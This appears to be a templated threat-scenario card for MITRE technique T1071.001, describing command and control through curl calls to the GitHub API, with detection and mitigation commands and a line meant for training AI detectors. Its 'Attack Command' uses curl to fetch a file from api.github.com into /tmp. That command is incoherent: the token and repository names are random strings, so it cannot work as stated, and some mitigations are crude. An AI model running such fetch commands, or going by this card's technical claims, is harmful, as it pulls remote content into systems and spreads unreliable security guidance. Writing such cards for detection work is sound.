---
type: campaign
scenario_id: 492
tactic: Command and Control
technique: "T1071.001: Application Layer Protocol: Web Protocols"
technique_id: T1071.001
tags: [campaign, lotl, command_and_control]
---

# Using curl to communicate with GitHub API for C2.

## Threat Description
Using curl to communicate with GitHub API for C2.

## Attack Command
```
curl -H "Authorization: Bearer $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 32)" https://api.github.com/repos/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)/contents/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt -o /tmp/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt
```

## Detection Logic
Monitor curl GitHub: `ps aux | grep curl | grep api.github.com`; Network traffic: `tcpdump -i any host api.github.com`.

## Mitigation
Restrict curl: `chmod 700 /usr/bin/curl`; Block GitHub API: `iptables -A OUTPUT -d api.github.com -j DROP`.

## AI Training Prompt
Train AI to detect curl-based C2 via GitHub API by analyzing HTTP headers, GitHub API endpoints, and file creation patterns; recommend API blocking.

## References
- MITRE ATT&CK T1071.001: https://attack.mitre.org/techniques/T1071/001/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
